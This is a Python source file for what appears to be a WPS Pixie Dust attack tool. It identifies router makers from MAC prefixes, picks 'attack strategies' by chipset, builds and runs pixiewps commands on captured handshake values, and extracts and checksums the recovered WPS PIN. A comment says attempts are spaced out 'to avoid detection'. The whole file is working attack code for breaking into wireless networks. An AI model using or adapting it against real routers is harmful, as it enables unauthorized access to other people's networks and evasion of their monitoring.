import subprocess
import time
import re
from typing import Optional, Tuple, List

class RouterInfo:
    """Stores router information and vulnerability details."""
    
    def __init__(self):
        self.model = ''
        self.manufacturer = ''
        self.vulnerability_type = ''
        self.attack_strategy = []
    
    @staticmethod
    def identify_router(bssid: str, model_str: str) -> 'RouterInfo':
        """Identifies router model and its known vulnerabilities."""
        info = RouterInfo()
        
        # Common manufacturer prefixes
        manufacturer_prefixes = {
            '00:90:4C': 'Epigram/Broadcom',
            'F8:1A:67': 'TP-Link',
            'E4:F4:C6': 'NETGEAR',
            '00:18:F3': 'ASUSTek',
            'C8:3A:35': 'Tenda'
        }
        
        # Identify manufacturer from BSSID
        mac_prefix = bssid[:8].upper()
        info.manufacturer = manufacturer_prefixes.get(mac_prefix, 'Unknown')
        
        # Match router model against vulnerability database
        info.model = model_str
        info.vulnerability_type = RouterInfo._get_vulnerability_type(model_str)
        info.attack_strategy = RouterInfo._get_attack_strategy(info.vulnerability_type)
        
        return info
    
    @staticmethod
    def _get_vulnerability_type(model: str) -> str:
        """Determines vulnerability type based on router model."""
        # Ralink/MediaTek
        if any(x in model.upper() for x in ['RT28', 'RT30', 'MT76']):
            return 'ralink'
        # Broadcom
        elif any(x in model.upper() for x in ['BCM', 'BROADCOM']):
            return 'broadcom'
        # Realtek
        elif any(x in model.upper() for x in ['RTL', 'REALTEK']):
            return 'realtek'
        # Modern TP-Link
        elif 'ARCHER' in model.upper():
            return 'tplink_modern'
        return 'generic'
    
    @staticmethod
    def _get_attack_strategy(vuln_type: str) -> List[str]:
        """Returns ordered list of attack strategies based on vulnerability type."""
        strategies = {
            'ralink': ['ecos_simple', 'ecos_rtl', 'ralink'],
            'broadcom': ['brcm_auto', 'brcm_zero', 'brcm_5_35_2'],
            'realtek': ['rtl_819x', 'rtl_820x'],
            'tplink_modern': ['tplink_v1', 'tplink_v2'],
            'generic': ['brcm_auto', 'ecos_simple', 'rtl_819x']
        }
        return strategies.get(vuln_type, ['brcm_auto'])

class Data:
    """Stored data used for pixiewps command."""

    def __init__(self):
        self.PKE = ''
        self.PKR = ''
        self.E_HASH1 = ''
        self.E_HASH2 = ''
        self.AUTHKEY = ''
        self.E_NONCE = ''
        self.R_NONCE = ''  # Added for modern router support
        self.E_BSSID = ''  # Added for modern router support
        self.E_S1 = ''    # Added for modern router support
        self.E_S2 = ''    # Added for modern router support
        self.router_info = None

    def getAll(self) -> bool:
        """Output all pixiewps related variables."""
        return bool(self.PKE and self.PKR and self.E_NONCE and self.AUTHKEY
                   and self.E_HASH1 and self.E_HASH2)

    def runPixieWps(self, show_command: bool = False, full_range: bool = False) -> Optional[str]:
        """Runs the pixiewps with multiple strategies and attempts to extract the WPS pin."""
        
        if not self.router_info:
            print('[*] Router information not available, using generic attack strategy')
            strategies = ['brcm_auto']
        else:
            strategies = self.router_info.attack_strategy
            print(f'[*] Using attack strategies for {self.router_info.manufacturer} '
                  f'({self.router_info.vulnerability_type}): {", ".join(strategies)}')

        for strategy in strategies:
            print(f'[*] Trying {strategy} strategy...')
            command = self._getPixieCmd(full_range, strategy)
            
            if show_command:
                print(' '.join(command))
            
            try:
                result = self._execute_pixiewps(command)
                if result:
                    return result
            except subprocess.TimeoutExpired:
                print(f'[-] Strategy {strategy} timed out, trying next method...')
                continue
            except subprocess.CalledProcessError as e:
                print(f'[-] Strategy {strategy} failed: {e}')
                continue
            
            # Add delay between attempts to avoid detection
            time.sleep(1)
        
        return None

    def _execute_pixiewps(self, command: List[str]) -> Optional[str]:
        """Executes pixiewps command with timeout and returns PIN if found."""
        try:
            process = subprocess.run(
                command,
                encoding='utf-8',
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                timeout=30  # 30 second timeout for each attempt
            )
            
            if process.returncode == 0:
                # Parse output for PIN
                pin = self._parse_pixiewps_output(process.stdout)
                if pin:
                    return pin
            
            return None
            
        except subprocess.TimeoutExpired:
            print('[-] Pixiewps execution timed out')
            return None

    def _parse_pixiewps_output(self, output: str) -> Optional[str]:
        """Parses pixiewps output to extract PIN and validate it."""
        for line in output.splitlines():
            if '[+]' in line and 'WPS pin' in line:
                pin = line.split(':')[-1].strip()
                
                if pin == '<empty>':
                    return ''
                    
                # Validate PIN format
                if self._validate_pin(pin):
                    return pin
                    
        return None

    def _validate_pin(self, pin: str) -> bool:
        """Validates WPS PIN format and checksum."""
        if not pin:
            return False
            
        # Remove any non-digit characters
        pin = re.sub(r'\D', '', pin)
        
        # Check length
        if len(pin) != 8:
            return False
            
        # Validate checksum
        try:
            return self._wps_pin_checksum(pin)
        except ValueError:
            return False

    def _wps_pin_checksum(self, pin: str) -> bool:
        """Validates the WPS PIN checksum."""
        if len(pin) != 8:
            return False
            
        accum = 0
        
        # PIN checksum algorithm
        accum += 3 * (int(pin[0]) + int(pin[2]) + int(pin[4]) + int(pin[6]))
        accum += int(pin[1]) + int(pin[3]) + int(pin[5]) + int(pin[7])
        
        return accum % 10 == 0

    def _getPixieCmd(self, full_range: bool = False, strategy: str = 'brcm_auto') -> List[str]:
        """Generates a list representing the command for the pixiewps tool."""
        
        pixiecmd = ['pixiewps']
        
        # Basic parameters
        pixiecmd.extend([
            '--pke', self.PKE,
            '--pkr', self.PKR,
            '--e-hash1', self.E_HASH1,
            '--e-hash2', self.E_HASH2,
            '--authkey', self.AUTHKEY,
            '--e-nonce', self.E_NONCE
        ])

        # Add strategy-specific parameters
        if strategy == 'ecos_simple':
            pixiecmd.extend(['--mode', '3'])
        elif strategy == 'brcm_zero':
            pixiecmd.extend(['--mode', '1'])
        elif strategy == 'tplink_v1':
            pixiecmd.extend(['--mode', '4'])
            if self.E_S1 and self.E_S2:
                pixiecmd.extend(['--e-s1', self.E_S1, '--e-s2', self.E_S2])
        
        # Additional data for modern routers
        if self.R_NONCE:
            pixiecmd.extend(['--r-nonce', self.R_NONCE])
        if self.E_BSSID:
            pixiecmd.extend(['--e-bssid', self.E_BSSID])
        
        if full_range:
            pixiecmd.append('--force')
        
        return pixiecmd

    def clear(self):
        """Resets the pixiewps variables."""
        self.__init__()
